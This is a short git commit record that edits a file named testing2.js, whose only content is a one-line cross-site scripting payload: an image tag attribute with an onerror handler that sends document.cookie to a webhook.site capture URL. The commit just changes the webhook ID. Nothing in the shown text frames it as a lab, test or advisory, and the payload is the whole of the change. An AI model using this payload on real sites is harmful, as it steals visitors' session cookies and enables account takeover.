4c7fe08c8a32ae7c7064d3a74c3e26f717071b64
Mitchellzhou1 <95938232+Mitchellzhou1@users.noreply.github.com>
2023-11-25 23:00:56 -0500

    Update testing2.js

--- testing2.js
+++ testing2.js
@@ -1,1 +1,1 @@
-src=x onerror=this.src='https://webhook.site/f88c0ce5-163d-4a2b-8acd-4a784d62a3ef/?'+document.cookie;
+src=x onerror=this.src='https://webhook.site/4c24e19c-d231-4c87-a40b-6d2aefd35a79/?'+document.cookie;
